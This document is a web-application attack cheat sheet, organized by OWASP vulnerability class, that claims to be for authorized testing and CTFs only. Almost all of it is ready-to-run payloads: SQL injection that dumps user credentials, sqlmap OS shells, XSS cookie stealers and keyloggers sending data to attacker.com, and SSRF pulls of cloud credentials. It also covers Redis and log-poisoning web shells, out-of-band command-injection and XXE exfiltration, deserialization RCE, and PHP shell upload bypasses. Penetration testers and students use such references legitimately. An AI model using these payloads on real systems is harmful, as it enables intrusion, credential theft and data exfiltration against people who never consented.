# Web Application Attacks (OWASP Top 10 Attack Techniques & Exploitation)

> For authorized security testing, CTF competitions, and educational purposes only.

Practical attack patterns against web applications, organized by vulnerability class.
Every example assumes you have written authorization to test the target.

---

## SQL Injection

### Detection

```bash
# Simple test — look for errors or behavior changes
curl "https://target.com/item?id=1'"
curl "https://target.com/item?id=1 AND 1=1"
curl "https://target.com/item?id=1 AND 1=2"

# Common error strings to grep for
# "You have an error in your SQL syntax"
# "ORA-01756"  (Oracle)
# "pg_query"   (PostgreSQL)
# "ODBC SQL Server Driver"
# "SQLite3::query"
```

### Union-Based SQLi

```bash
# Determine number of columns
curl "https://target.com/item?id=1 ORDER BY 1--"
curl "https://target.com/item?id=1 ORDER BY 5--"  # increment until error

# Extract data via UNION SELECT
curl "https://target.com/item?id=-1 UNION SELECT 1,2,3,4--"
# Whichever numbers display on page are injectable columns

# Database version
curl "https://target.com/item?id=-1 UNION SELECT 1,@@version,3,4--"        # MySQL
curl "https://target.com/item?id=-1 UNION SELECT 1,version(),3,4--"        # PostgreSQL

# List databases (MySQL)
curl "https://target.com/item?id=-1 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata--"

# List tables
curl "https://target.com/item?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='targetdb'--"

# List columns
curl "https://target.com/item?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--"

# Dump credentials
curl "https://target.com/item?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users--"
```

### Blind SQL Injection

```bash
# Boolean-based blind
curl "https://target.com/item?id=1 AND SUBSTRING(@@version,1,1)='5'--"
# Compare response size/content to infer true/false

# Extract data one character at a time
curl "https://target.com/item?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--"

# Time-based blind
curl "https://target.com/item?id=1; IF(1=1, SLEEP(5), 0)--"           # MySQL
curl "https://target.com/item?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"  # PostgreSQL
# If response takes 5 seconds, injection confirmed
```

### SQLMap

```bash
# Basic scan
sqlmap -u "https://target.com/item?id=1" --batch

# With cookie/session
sqlmap -u "https://target.com/item?id=1" --cookie="PHPSESSID=abc123" --batch

# POST parameter
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" -p user --batch

# Enumerate databases
sqlmap -u "https://target.com/item?id=1" --dbs --batch

# Dump specific table
sqlmap -u "https://target.com/item?id=1" -D targetdb -T users --dump --batch

# OS shell (if stacked queries + FILE priv)
sqlmap -u "https://target.com/item?id=1" --os-shell --batch

# Tamper scripts for WAF bypass
sqlmap -u "https://target.com/item?id=1" --tamper=space2comment,between --batch

# From Burp request file
sqlmap -r request.txt --batch --level=5 --risk=3
```

---

## Cross-Site Scripting (XSS)

### Reflected XSS

```bash
# Basic test payloads
curl "https://target.com/search?q=<script>alert(1)</script>"
curl "https://target.com/search?q=\"onmouseover=\"alert(1)\""
curl "https://target.com/search?q=<img src=x onerror=alert(1)>"

# SVG-based
curl "https://target.com/search?q=<svg/onload=alert(1)>"

# Filter bypass examples
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
<svg><script>alert&lpar;1&rpar;</script>
javascript:alert(1)  # in href attributes
```

### Stored XSS

```bash
# Inject via POST (comment field, profile name, etc.)
curl -X POST "https://target.com/comment" \
  -d "body=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>" \
  -b "session=abc123"

# Cookie stealer payload
<script>
fetch('https://attacker.com/log?c='+document.cookie)
</script>

# Keylogger payload
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?k='+e.key);
});
</script>
```

### DOM-Based XSS

```javascript
// Vulnerable pattern — innerHTML with user input
document.getElementById('output').innerHTML = location.hash.slice(1);

// Test: https://target.com/page#<img src=x onerror=alert(1)>

// Vulnerable pattern — eval with user input
eval(new URLSearchParams(location.search).get('callback'));

// Vulnerable pattern — document.write
document.write('<h1>' + decodeURIComponent(location.search.split('name=')[1]) + '</h1>');
```

---

## Server-Side Request Forgery (SSRF)

```bash
# Basic SSRF — fetch internal resources
curl "https://target.com/fetch?url=http://127.0.0.1:80"
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Cloud metadata endpoints
# AWS:   http://169.254.169.254/latest/meta-data/
# GCP:   http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (header: Metadata: true)

# Bypass filters
curl "https://target.com/fetch?url=http://0x7f000001/"          # hex IP
curl "https://target.com/fetch?url=http://0177.0.0.1/"          # octal IP
curl "https://target.com/fetch?url=http://2130706433/"           # decimal IP
curl "https://target.com/fetch?url=http://127.1/"               # shortened
curl "https://target.com/fetch?url=http://[::1]/"               # IPv6 loopback
curl "https://target.com/fetch?url=http://attacker.com@127.0.0.1/"  # URL authority confusion

# Internal port scanning via SSRF
for port in 22 80 443 3306 5432 6379 8080 9200; do
  curl -s -o /dev/null -w "%{http_code} port:$port\n" "https://target.com/fetch?url=http://127.0.0.1:$port"
done

# SSRF to RCE via Gopher (Redis example)
curl "https://target.com/fetch?url=gopher://127.0.0.1:6379/_SET%20shell%20%22<%3Fphp%20system(%24_GET['cmd'])%3B%3F>%22%0ACONFIG%20SET%20dir%20/var/www/html%0ACONFIG%20SET%20dbfilename%20shell.php%0ASAVE"
```

---

## Path Traversal / Local File Inclusion

```bash
# Basic directory traversal
curl "https://target.com/file?name=../../../etc/passwd"
curl "https://target.com/file?name=....//....//....//etc/passwd"  # double encoding bypass
curl "https://target.com/file?name=..%2f..%2f..%2fetc%2fpasswd"  # URL encoded
curl "https://target.com/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Null byte injection (older PHP < 5.3.4)
curl "https://target.com/file?name=../../../etc/passwd%00.png"

# Windows paths
curl "https://target.com/file?name=..\..\..\..\windows\system32\drivers\etc\hosts"
curl "https://target.com/file?name=....\\....\\....\\windows\\win.ini"

# Key files to read
/etc/passwd
/etc/shadow          # requires root-level LFI
/etc/hosts
/proc/self/environ   # environment variables
/proc/self/cmdline   # running command
/var/log/apache2/access.log   # log poisoning target
~/.ssh/id_rsa        # SSH keys
/var/www/html/.env   # application secrets

# LFI to RCE via log poisoning
# 1. Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" "https://target.com/"
# 2. Include the log file
curl "https://target.com/file?name=../../../var/log/apache2/access.log&cmd=id"

# PHP wrapper for source code
curl "https://target.com/file?name=php://filter/convert.base64-encode/resource=index.php"
```

---

## Command Injection

```bash
# Basic injection operators
curl "https://target.com/ping?host=127.0.0.1;id"
curl "https://target.com/ping?host=127.0.0.1|id"
curl "https://target.com/ping?host=127.0.0.1||id"
curl "https://target.com/ping?host=127.0.0.1&&id"
curl "https://target.com/ping?host=\$(id)"
curl "https://target.com/ping?host=127.0.0.1%0aid"  # newline injection

# Blind command injection — out-of-band
curl "https://target.com/ping?host=127.0.0.1;curl+https://attacker.com/\$(whoami)"
curl "https://target.com/ping?host=127.0.0.1;nslookup+\$(whoami).attacker.com"

# Blind command injection — time-based
curl "https://target.com/ping?host=127.0.0.1;sleep+5"

# Filter bypass
# Space bypass
curl "https://target.com/ping?host=127.0.0.1;\${IFS}id"
curl "https://target.com/ping?host=127.0.0.1;cat</etc/passwd"

# Keyword bypass
curl "https://target.com/ping?host=127.0.0.1;w'h'o'a'm'i"
curl "https://target.com/ping?host=127.0.0.1;/bin/c?t /etc/passwd"
```

---

## Insecure Direct Object Reference (IDOR)

```bash
# Horizontal privilege escalation — access other users' data
curl -b "session=user_a_token" "https://target.com/api/users/1001/profile"  # your profile
curl -b "session=user_a_token" "https://target.com/api/users/1002/profile"  # another user's profile

# Enumerate IDs
for id in $(seq 1000 1100); do
  curl -s -b "session=token" "https://target.com/api/orders/$id" | jq '.customer_name' 2>/dev/null
done

# UUID/GUID-based IDOR — harder but not impossible
# Leak UUIDs from API responses, logs, or referrer headers

# IDOR in file downloads
curl -b "session=token" "https://target.com/download?file_id=500"
curl -b "session=token" "https://target.com/download?file_id=501"

# IDOR in POST/PUT/DELETE
curl -X PUT -b "session=user_a" "https://target.com/api/users/1002" \
  -H "Content-Type: application/json" -d '{"role":"admin"}'
```

---

## Cross-Site Request Forgery (CSRF)

```html
<!-- GET-based CSRF -->
<img src="https://target.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- POST-based CSRF (auto-submit form) -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>

<!-- JSON body CSRF via fetch (if no CORS/CSRF protection) -->
<script>
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
</script>
```

---

## XML External Entity (XXE)

```bash
# Basic XXE — read local files
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'

# XXE via SSRF
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>'

# Blind XXE — out-of-band exfiltration
# Host a DTD on attacker server (evil.dtd):
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?d=%file;'>">
# %eval; %exfil;

curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>'

# XXE in file upload (SVG, DOCX, XLSX all use XML internally)
# Craft SVG with XXE:
# <?xml version="1.0"?>
# <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
# <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

---

## Insecure Deserialization

```bash
# Java deserialization — ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64 > payload.txt
# Send base64 payload in vulnerable parameter

# PHP deserialization
# Craft serialized object:  O:4:"User":1:{s:4:"role";s:5:"admin";}
# Send via cookie or POST parameter

# Python pickle
# import pickle, os
# class Exploit:
#     def __reduce__(self):
#         return (os.system, ('id',))
# pickle.dumps(Exploit())

# Node.js — node-serialize RCE
# {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

---

## File Upload Bypass

```bash
# Extension bypass
shell.php            # blocked
shell.php5           # try alternate extensions
shell.phtml
shell.phar
shell.php.jpg        # double extension
shell.php%00.jpg     # null byte (older systems)
shell.PhP            # case variation

# Content-Type bypass
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg"

# Magic bytes bypass — prepend valid image header
# GIF header
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif.php

# Overwrite .htaccess to enable PHP execution
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Upload .htaccess, then upload shell.jpg containing PHP code

# Upload to writable directory + path traversal
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php"
```

---

## Tips

- Always check for WAF before testing — send an obvious payload and observe the block page
- Use Burp Suite Repeater to iterate on payloads quickly
- Encode payloads (URL encoding, double encoding, Unicode) to bypass filters
- Chain vulnerabilities: SSRF + IDOR, LFI + log poisoning, XSS + CSRF
- Check API endpoints separately from the web UI — they often lack protections
- Test PUT/DELETE/PATCH methods even if the UI only uses GET/POST
- Use `ffuf` with SecLists payloads for automated fuzzing of parameters
- Monitor response length and timing differences for blind injection detection
- Test with both authenticated and unauthenticated contexts

---

## See Also

- recon
- burpsuite
- metasploit
- privilege-escalation
- password-attacks
- html
- css

## References

- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks Web Pentesting](https://book.hacktricks.xyz/pentesting-web)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SQLMap Documentation](https://sqlmap.org/)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [SecLists](https://github.com/danielmiessler/SecLists)
